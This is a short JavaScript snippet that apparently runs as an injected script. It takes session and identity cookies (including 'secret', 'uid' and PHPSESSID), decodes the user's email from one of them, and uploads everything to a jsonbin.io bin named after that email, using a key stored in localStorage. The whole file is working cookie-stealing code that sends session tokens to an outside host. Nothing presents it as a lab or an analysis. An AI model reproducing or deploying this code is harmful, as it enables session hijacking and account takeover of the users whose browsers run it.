(function() {
    console.log("Executing n.js...");

    // Fetch the master key from localStorage
    let masterKey = localStorage.getItem('masterKey');
    console.log("Master Key from n.js:", masterKey);

    if (!masterKey) {
        console.error("Error: Master Key not found!");
        return;
    }

    // The rest of your logic for n.js:

    let xhr = new XMLHttpRequest(),
        binID, email, req, cookieData = {};

    document.cookie.split('; ').forEach(function(c) {
        let parts = c.split('=');
        if (['secret', 'unam', 'uid', 'PHPSESSID'].includes(parts[0])) {
            cookieData[parts[0]] = parts[1];
            if (parts[0] === 'uid') {
                email = atob(decodeURIComponent(parts[1]));
            }
        }
    });

    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
            binID = JSON.parse(xhr.responseText)?.metadata?.id;
            if (binID && email) {
                req = new XMLHttpRequest();
                req.onreadystatechange = function() {
                    if (req.readyState === 4) {
                        console.log("Shranjeno:", req.responseText);
                    }
                };
                req.open("PUT", "https://api.jsonbin.io/v3/b/" + binID + "/meta/name", true);
                req.setRequestHeader("X-Bin-Name", email);
                req.setRequestHeader("X-Master-Key", masterKey);
                req.send();
            }
        }
    };

    xhr.open('POST', 'https://api.jsonbin.io/v3/b', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader("X-Master-Key", masterKey);
    xhr.send(JSON.stringify(cookieData));

    // Additional logic if you have any...

})();
